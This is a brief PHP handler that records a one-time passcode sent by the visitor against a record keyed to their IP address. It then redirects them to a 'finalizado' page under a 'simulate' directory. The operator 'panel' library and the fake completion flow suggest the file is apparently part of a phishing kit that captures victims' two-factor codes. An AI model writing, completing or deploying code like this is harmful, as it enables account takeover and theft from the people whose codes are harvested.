<?php
require('../panel/lib/funciones.php');
$ip = $_SERVER['REMOTE_ADDR'];
$reg = traer_regitro($ip);
$otp = $_POST['otp'] ?? '';

actualizar_registro_otp($reg, $otp);
header("Location: ../simulate/finalizado.php"); 
exit();
